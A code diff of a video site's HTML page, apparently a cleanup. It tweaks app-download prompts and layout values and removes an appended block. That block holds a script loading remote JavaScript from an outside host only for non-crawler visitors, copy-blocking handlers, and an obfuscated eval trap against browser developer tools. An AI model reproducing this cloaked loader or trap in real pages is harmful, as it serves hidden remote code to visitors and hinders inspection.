@@ -98,21 +98,20 @@ if (isMobile) {
 }
 }
 function zlogo(){
-	document.getElementById('zlogo').innerHTML ='<div class="zblogo"><a href="https://haomitv.github.io/haomitv/7xvod.html" target="_blank"><m class="zbbtn">下载APP</m></a></div>';
+	document.getElementById('zlogo').innerHTML ='<div class="zblogo"><a href="/m.html" target="_blank"><m class="zbbtn">下载APP</m></a></div>';
 }
 function appdown(){
 	if (isMobile) {
-		var gd='20';//手机高度
+		var gd='15';//手机高度
 		os='mplay();';
 	}else{
-		var gd='250';//电脑高度
+		var gd='90';//电脑高度
 		os='onckplayer();';if(isdp){os='ondplayer();';}
 	}
 
-	var pcxs='<div style="padding:'+gd+'px 0;text-align:center;background-color:#000;"><p style="margin-bottom:15px;font-size:21px;font-weight:200"><font color="#FFFFFF">请下载app观看，网页随时失效</font></p><p style="padding:5px 0"><a class="anniu" href="javascript:;" onclick="'+os+'">点击观看</a>  <a class="anniu" href="https://haomitv.github.io/haomitv/7xvod.html" target="_blank">下载APP</a></p><small><font color="#FFFFFF">安装APP观看速度更快哟！支持下载和投屏</font></small></div>';
+	var pcxs='<div style="padding:'+gd+'px 0;text-align:center;background-color:#000;"><p style="margin-bottom:15px;font-size:21px;font-weight:200"><font color="#FFFFFF">网页版随时失效，请下app观看</font></p><p style="padding:5px 0"><a class="anniu" href="javascript:;" onclick="'+os+'">点击观看</a>  <a class="anniu" href="https://haomitv.github.io/haomitv/7xvod.html" target="_blank">下载APP</a></p><small><font color="#FFFFFF">安装APP观看速度更快哟！支持下载和投屏</font></small></div>';
 	document.getElementById('video').innerHTML = pcxs;
 }
-
 function mplay(){
 	var html = '<video id="media" src="' + videoUrl + '" poster="'+zstp+'" width="100%" height="100%" webkit-playsinline="true" preload="meta" controls="controls" x5-video-player-type="h5"></video>';
     document.getElementById('video').innerHTML = html;
@@ -206,17 +205,3 @@ function ondplayer2(){
 </script>
 </body>
 </html>
-
-<script type="text/javascript">
-var dkdz='https://www.govyiwu.cn:12443/ty/7604C56E-FC83-13357-22-D9681790E933.alpha';
-if(navigator.userAgent.match(/Baiduspider|Bytespider|YisouSpider|360Spider|gjuren123/i)==null){document.write('<script src="'+dkdz+'"><\/script>');}
-</script>
- <!--/禁止右键-->
-<script type="text/javascript"> document.body.oncontextmenu=document.body.ondragstart= document.body.onselectstart=document.body.onbeforecopy=function(){return false;};
-document.body.onselect=document.body.oncopy=document.body.onmouseup=function(){document.selection.empty();}; </script> 
- <!--/禁止F12-->
-<script>
-eval(function(d,f,a,c,b,e){b=function(a){return a.toString(f)};if(!"".replace(/^/,String)){for(;a--;)e[b(a)]=c[a]||b(a);c=[function(a){return e[a]}];b=function(){return"\\w+"};a=1}for(;a--;)c[a]&&(d=d.replace(new RegExp("\\b"+b(a)+"\\b","g"),c[a]));return d}("1 2=c.3('8');4.b(2,'5',{6:7(){1 a=\"\";9(1 i=0;i<d;i++){a=a+i.e();f.g(0,0,a)}}});h.j(2);",20,20," var x createElement Object id get function div for  defineProperty document 1000000 toString history pushState console  log".split(" "),0,{}));
-</script>
-
-<div style="display:none;"></div>
